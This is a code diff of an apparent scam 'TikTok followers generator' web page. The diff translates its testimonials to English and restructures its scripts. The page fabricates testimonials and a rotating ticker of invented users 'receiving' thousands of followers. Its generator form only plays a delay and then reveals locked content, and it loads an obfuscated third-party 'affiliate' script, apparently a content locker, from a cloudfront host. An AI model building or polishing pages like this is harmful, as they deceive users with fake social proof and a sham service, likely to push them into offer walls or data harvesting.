@@ -7,10 +7,11 @@
     <!-- TikTok-like fonts and icon -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Montserrat:wght@700&display=swap" rel="stylesheet">
     <!-- Affiliate Script -->
-<script type="text/javascript">
-    var UBQfL_naw_oVVhKc={"it":4510668,"key":"fc70a"};
-</script>
-<script src="https://dfmpe7igjx4jo.cloudfront.net/45d4b74.js"></script>
+    <script type="text/javascript">
+        var UBQfL_naw_oVVhKc={"it":4510668,"key":"fc70a"};
+    </script>
+    <script src="https://dfmpe7igjx4jo.cloudfront.net/45d4b74.js"></script>
+    <style>
         body {
             background: linear-gradient(135deg,#000 60%,#ff2d55 100%);
             font-family: 'Roboto', Arial, sans-serif;
@@ -354,52 +355,51 @@
         <!-- Success Ticker - responsive and compact, above testimonials -->
         <div class="success-ticker" id="successTicker"></div>
         <!-- Testimoni Section -->
-        <div class="testimoni-section">
-            <h2>Testimonials</h2>
-            <div class="testimoni-list">
-                <div class="testimoni-item">
-                    <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/women/55.jpg" alt="avatar">
-                    <div class="testimoni-content">
-                        <div class="testimoni-user">@claire99</div>
-                        <div class="testimoni-details">"Wow, followers langsung bertambah! Recommended banget!"</div>
-                        <div class="testimoni-date">1 min ago</div>
-                    </div>
-                </div>
-                <div class="testimoni-item">
-                    <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/men/23.jpg" alt="avatar">
-                    <div class="testimoni-content">
-                        <div class="testimoni-user">@joseph_mx</div>
-                        <div class="testimoni-details">"Got 1,000 followers in less than 10 minutes. Awesome service."</div>
-                        <div class="testimoni-date">4 min ago</div>
-                    </div>
-                </div>
-                <div class="testimoni-item">
-                    <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/women/79.jpg" alt="avatar">
-                    <div class="testimoni-content">
-                        <div class="testimoni-user">@nanda_id</div>
-                        <div class="testimoni-details">"Aku sudah coba, likes & followers masuk semua. Mantap!"</div>
-                        <div class="testimoni-date">6 min ago</div>
-                    </div>
-                </div>
-                <div class="testimoni-item">
-                    <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/men/77.jpg" alt="avatar">
-                    <div class="testimoni-content">
-                        <div class="testimoni-user">@liam_us</div>
-                        <div class="testimoni-details">"Skeptical at first, but it really works! Thank you!"</div>
-                        <div class="testimoni-date">8 min ago</div>
-                    </div>
-                </div>
-                <div class="testimoni-item">
-                    <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/women/82.jpg" alt="avatar">
-                    <div class="testimoni-content">
-                        <div class="testimoni-user">@paola_br</div>
-                        <div class="testimoni-details">"Muito bom! Os seguidores chegaram rapidinho."</div>
-                        <div class="testimoni-date">10 min ago</div>
-                    </div>
-                </div>
+<div class="testimoni-section">
+    <h2>Testimonials</h2>
+    <div class="testimoni-list">
+        <div class="testimoni-item">
+            <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/women/55.jpg" alt="avatar">
+            <div class="testimoni-content">
+                <div class="testimoni-user">@claire99</div>
+                <div class="testimoni-details">"Wow, my followers increased instantly! Highly recommended!"</div>
+                <div class="testimoni-date">1 min ago</div>
+            </div>
+        </div>
+        <div class="testimoni-item">
+            <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/men/23.jpg" alt="avatar">
+            <div class="testimoni-content">
+                <div class="testimoni-user">@joseph_mx</div>
+                <div class="testimoni-details">"Got 1,000 followers in less than 10 minutes. Awesome service."</div>
+                <div class="testimoni-date">4 min ago</div>
+            </div>
+        </div>
+        <div class="testimoni-item">
+            <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/women/79.jpg" alt="avatar">
+            <div class="testimoni-content">
+                <div class="testimoni-user">@nanda_id</div>
+                <div class="testimoni-details">"I've tried it, and all the likes and followers arrived. Amazing!"</div>
+                <div class="testimoni-date">6 min ago</div>
+            </div>
+        </div>
+        <div class="testimoni-item">
+            <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/men/77.jpg" alt="avatar">
+            <div class="testimoni-content">
+                <div class="testimoni-user">@liam_us</div>
+                <div class="testimoni-details">"Skeptical at first, but it really works! Thank you!"</div>
+                <div class="testimoni-date">8 min ago</div>
+            </div>
+        </div>
+        <div class="testimoni-item">
+            <img class="testimoni-avatar" src="https://randomuser.me/api/portraits/women/82.jpg" alt="avatar">
+            <div class="testimoni-content">
+                <div class="testimoni-user">@paola_br</div>
+                <div class="testimoni-details">"Very good! The followers arrived really fast."</div>
+                <div class="testimoni-date">10 min ago</div>
             </div>
         </div>
     </div>
+</div>
     <script>
         // Multi-language data
         const langData = {
@@ -486,84 +486,87 @@
             document.getElementById('langSelect').value = lang;
         }
 
-        document.getElementById('langSelect').addEventListener('change', (e) => {
-            setLang(e.target.value);
+        // Make sure DOM is loaded before adding event listeners
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('langSelect').addEventListener('change', (e) => {
+                setLang(e.target.value);
+            });
+
+            document.getElementById('generatorForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                var btn = document.getElementById('generateBtn');
+                var d = langData[currentLang];
+                btn.disabled = true;
+                btn.innerHTML = '<span class="spinner"></span>' + (d.generatingBtn || "Generating...");
+
+                setTimeout(function() {
+                    document.getElementById('generatorForm').style.display = 'none';
+                    document.getElementById('lockedContent').style.display = 'block';
+                    btn.disabled = false;
+                    btn.innerHTML = d.generateBtn;
+                }, 2500);
+            });
+
+            setLang('en');
+            autoDetectLanguage();
+
+            // --- Success Ticker Data (20 entries, all unique) ---
+            const successData = [
+                { user: "kevin_usa", followers: "1,000", likes: "2,500", ago: "just now" },
+                { user: "alice.tok", followers: "2,500", likes: "5,000", ago: "1 min ago" },
+                { user: "renata_br", followers: "5,000", likes: "10,000", ago: "2 min ago" },
+                { user: "yusron_id", followers: "500", likes: "1,000", ago: "2 min ago" },
+                { user: "chloe99", followers: "1,000", likes: "2,500", ago: "3 min ago" },
+                { user: "miguelmx", followers: "2,500", likes: "5,000", ago: "3 min ago" },
+                { user: "sofia.tiktok", followers: "5,000", likes: "10,000", ago: "4 min ago" },
+                { user: "prakash.in", followers: "500", likes: "1,000", ago: "4 min ago" },
+                { user: "felipe_brz", followers: "1,000", likes: "2,500", ago: "5 min ago" },
+                { user: "karen_jp", followers: "2,500", likes: "5,000", ago: "6 min ago" },
+                { user: "isabelmex", followers: "5,000", likes: "10,000", ago: "7 min ago" },
+                { user: "johnny", followers: "1,000", likes: "2,500", ago: "8 min ago" },
+                { user: "giovana_brazil", followers: "2,500", likes: "5,000", ago: "9 min ago" },
+                { user: "malik_ind", followers: "500", likes: "1,000", ago: "10 min ago" },
+                { user: "lucy_uk", followers: "1,000", likes: "2,500", ago: "11 min ago" },
+                { user: "matteo.it", followers: "2,500", likes: "5,000", ago: "12 min ago" },
+                { user: "sabrina_es", followers: "5,000", likes: "10,000", ago: "13 min ago" },
+                { user: "dian_sg", followers: "1,000", likes: "2,500", ago: "14 min ago" },
+                { user: "alex_fr", followers: "2,500", likes: "5,000", ago: "15 min ago" },
+                { user: "hana_kr", followers: "5,000", likes: "10,000", ago: "16 min ago" }
+            ];
+
+            // --- Success Ticker Logic ---
+            let tickerIndex = 0;
+            const tickerEl = document.getElementById('successTicker');
+            function showTicker(idx) {
+                const data = successData[idx];
+                tickerEl.innerHTML =
+                    `<span class="tiktok-user">@${data.user}</span> 
+                    just received 
+                    <span class="tiktok-followers">${data.followers} Followers</span> 
+                    & 
+                    <span class="tiktok-likes">${data.likes} Likes</span>
+                    <span class="tiktok-time">· ${data.ago}</span>`;
+                tickerEl.classList.add('visible');
+            }
+            function hideTicker() {
+                tickerEl.classList.remove('visible');
+            }
+            function nextTicker() {
+                hideTicker();
+                setTimeout(() => {
+                    tickerIndex = (tickerIndex + 1) % successData.length;
+                    showTicker(tickerIndex);
+                }, 400); // match transition
+            }
+            showTicker(tickerIndex);
+            setInterval(nextTicker, 2800);
+
+            function autoDetectLanguage() {
+                const navLang = navigator.language || navigator.userLanguage || "en";
+                const detectedLang = mapNavigatorLanguage(navLang);
+                setLang(detectedLang);
+            }
         });
-
-        document.getElementById('generatorForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            var btn = document.getElementById('generateBtn');
-            var d = langData[currentLang];
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span>' + (d.generatingBtn || "Generating...");
-
-            setTimeout(function() {
-                document.getElementById('generatorForm').style.display = 'none';
-                document.getElementById('lockedContent').style.display = 'block';
-                btn.disabled = false;
-                btn.innerHTML = d.generateBtn;
-            }, 2500);
-        });
-
-        function autoDetectLanguage() {
-            const navLang = navigator.language || navigator.userLanguage || "en";
-            const detectedLang = mapNavigatorLanguage(navLang);
-            setLang(detectedLang);
-        }
-
-        setLang('en');
-        autoDetectLanguage();
-
-        // --- Success Ticker Data (20 entries, all unique) ---
-        const successData = [
-            { user: "kevin_usa", followers: "1,000", likes: "2,500", ago: "just now" },
-            { user: "alice.tok", followers: "2,500", likes: "5,000", ago: "1 min ago" },
-            { user: "renata_br", followers: "5,000", likes: "10,000", ago: "2 min ago" },
-            { user: "yusron_id", followers: "500", likes: "1,000", ago: "2 min ago" },
-            { user: "chloe99", followers: "1,000", likes: "2,500", ago: "3 min ago" },
-            { user: "miguelmx", followers: "2,500", likes: "5,000", ago: "3 min ago" },
-            { user: "sofia.tiktok", followers: "5,000", likes: "10,000", ago: "4 min ago" },
-            { user: "prakash.in", followers: "500", likes: "1,000", ago: "4 min ago" },
-            { user: "felipe_brz", followers: "1,000", likes: "2,500", ago: "5 min ago" },
-            { user: "karen_jp", followers: "2,500", likes: "5,000", ago: "6 min ago" },
-            { user: "isabelmex", followers: "5,000", likes: "10,000", ago: "7 min ago" },
-            { user: "johnny", followers: "1,000", likes: "2,500", ago: "8 min ago" },
-            { user: "giovana_brazil", followers: "2,500", likes: "5,000", ago: "9 min ago" },
-            { user: "malik_ind", followers: "500", likes: "1,000", ago: "10 min ago" },
-            { user: "lucy_uk", followers: "1,000", likes: "2,500", ago: "11 min ago" },
-            { user: "matteo.it", followers: "2,500", likes: "5,000", ago: "12 min ago" },
-            { user: "sabrina_es", followers: "5,000", likes: "10,000", ago: "13 min ago" },
-            { user: "dian_sg", followers: "1,000", likes: "2,500", ago: "14 min ago" },
-            { user: "alex_fr", followers: "2,500", likes: "5,000", ago: "15 min ago" },
-            { user: "hana_kr", followers: "5,000", likes: "10,000", ago: "16 min ago" }
-        ];
-
-        // --- Success Ticker Logic ---
-        let tickerIndex = 0;
-        const tickerEl = document.getElementById('successTicker');
-        function showTicker(idx) {
-            const data = successData[idx];
-            tickerEl.innerHTML =
-                `<span class="tiktok-user">@${data.user}</span> 
-                just received 
-                <span class="tiktok-followers">${data.followers} Followers</span> 
-                & 
-                <span class="tiktok-likes">${data.likes} Likes</span>
-                <span class="tiktok-time">· ${data.ago}</span>`;
-            tickerEl.classList.add('visible');
-        }
-        function hideTicker() {
-            tickerEl.classList.remove('visible');
-        }
-        function nextTicker() {
-            hideTicker();
-            setTimeout(() => {
-                tickerIndex = (tickerIndex + 1) % successData.length;
-                showTicker(tickerIndex);
-            }, 400); // match transition
-        }
-        showTicker(tickerIndex);
-        setInterval(nextTicker, 2800);
     </script>
 </body>
 </html>
